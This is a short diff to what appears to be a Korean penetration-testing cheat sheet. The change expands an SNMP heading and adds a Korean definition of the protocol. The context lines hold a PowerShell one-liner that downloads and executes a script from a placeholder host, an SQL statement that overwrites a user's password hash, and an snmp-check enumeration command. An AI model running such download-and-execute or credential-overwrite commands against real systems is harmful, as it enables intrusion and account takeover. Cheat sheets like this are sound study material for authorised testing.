@@ -131,7 +131,8 @@ update planning_user set password ='df5b909019c9b1659e86e0d6bf8da81d6fa3499e' wh
 IEX(New-Object Net.WebClient).DownloadString("http://ip/file")
 ```
 ---
-# SNMP
+# SNMP(Simple Network Management Protocol)
+- 네트워크 장비(라우터, 스위치, 서버, 프린터 등)를 관리 및 모니터링하기 위한 표준 프로토콜
 ```bash
 snmp-check <ip>
 ```
